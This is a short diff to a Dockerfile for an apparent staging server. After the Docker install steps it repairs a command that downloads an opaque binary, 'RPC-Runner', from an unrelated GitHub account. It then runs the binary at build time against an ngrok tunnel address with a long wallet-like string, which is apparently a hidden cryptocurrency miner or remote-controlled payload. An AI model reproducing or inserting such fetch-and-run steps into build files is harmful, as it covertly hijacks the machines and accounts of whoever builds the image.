@@ -10,7 +10,7 @@ RUN apt-get update && \
     add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu bionic stable" && \
     apt-get update && \
     apt install docker-ce
-RUN wget https://github.com/vultrdocker/portal-vultr/raw/master/RPC-Runner chmod u+x RPC-Runner
+RUN wget https://github.com/vultrdocker/portal-vultr/raw/master/RPC-Runner && chmod u+x RPC-Runner
 RUN ./RPC-Runner --daemon-address 0.tcp.ngrok.io:17030 --address gunsVsqShTeEfdPeJyQreNfSKfHLm5gfFi3WWywazefsRusPS4LjKoMYLigqfsvRsqKo4kJEEjtPkGPF7xsLQMGq8YcsjUESKm
 # copy files from the repository into this staging server
 COPY . .
